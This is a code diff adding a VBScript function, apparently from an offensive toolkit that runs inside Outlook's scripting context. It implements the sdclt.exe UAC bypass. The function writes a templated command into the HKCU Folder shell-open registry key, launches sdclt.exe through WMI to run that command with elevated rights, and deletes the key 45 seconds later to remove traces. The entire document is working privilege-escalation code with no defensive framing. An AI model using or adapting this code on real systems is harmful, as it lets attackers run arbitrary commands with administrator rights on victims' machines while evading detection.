@@ -1,0 +1,25 @@
+Function Execute_UAC_sdclt()
+	On Error Resume Next
+	Execute_UAC_sdclt = "SDCLT UAC BYPASS" & vbCrLf
+	Execute_UAC_sdclt = Execute_UAC_sdclt & SetRegValue_HKCU("Software\Classes\Folder\shell\open\command", "REG_SZ", "@", {{command}})
+	Execute_UAC_sdclt = Execute_UAC_sdclt & vbCrLf
+	Execute_UAC_sdclt = Execute_UAC_sdclt & SetRegValue_HKCU("Software\Classes\Folder\shell\open\command", "REG_SZ", "DelegateExecute", " ")
+	Execute_UAC_sdclt = Execute_UAC_sdclt & vbCrLf
+
+    Set objLocator = window.external.OutlookApplication.CreateObject("WbemScripting.SWbemLocator")
+    Set objService = objLocator.ConnectServer(".", "root\cimv2")
+    Set objConfig = objService.Get("Win32_ProcessStartup").SpawnInstance_()
+    Set objProcess = objService.Get("Win32_Process")
+    objProcess.Create "explorer /root,c:\windows\system32\sdclt.exe", Null, objConfig, varProcessId
+    Execute_UAC_sdclt = Execute_UAC_sdclt & "Executed sdclt.exe to trigger UAC bypass" & vbCrLf & "Process id sdclt.exe: " & varProcessId
+	Execute_UAC_sdclt = Execute_UAC_sdclt & vbCrLf
+	
+	'Sleep
+	Execute_UAC_sdclt = Execute_UAC_sdclt & "Running cleanup in 45 seconds (delete command reg key)"
+	window.clearTimeout(st)
+	st = window.setTimeout("wait", 45000, "VBScript")	
+End Function
+
+Sub wait()
+	DelRegKey_HKCU("Software\Classes\Folder\shell\open\command")
+End Sub
